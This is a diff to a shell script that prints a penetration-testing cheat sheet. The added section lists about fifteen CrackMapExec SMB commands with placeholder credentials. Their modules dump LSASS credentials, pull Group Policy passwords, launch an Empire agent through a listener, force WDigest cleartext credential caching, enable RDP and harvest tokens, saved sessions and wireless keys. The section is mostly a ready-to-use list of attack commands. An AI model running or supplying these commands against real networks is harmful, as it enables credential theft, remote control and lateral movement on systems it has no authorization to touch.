@@ -375,6 +375,29 @@ echo -e ""
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 
+# RDP
+echo -e "${LGREEN}Crackmapexec - Extra${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}SMB${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M bloodhound"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M empire_exec -o LISRENER=<Listener_Name>"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M enum_avproducts"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M enum_dns"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M gpp_autologin"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M gpp_password"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M invoke_sessiongopher"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M lsassy"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M rdp -o ACTION=enable"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M runasppl"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M spooler"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M tokens"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M uac"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M wdigest -o ACTION=enable"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M wireless"
+
+
+
+
 ################################################################################
 # End	                                                                       #
 ################################################################################
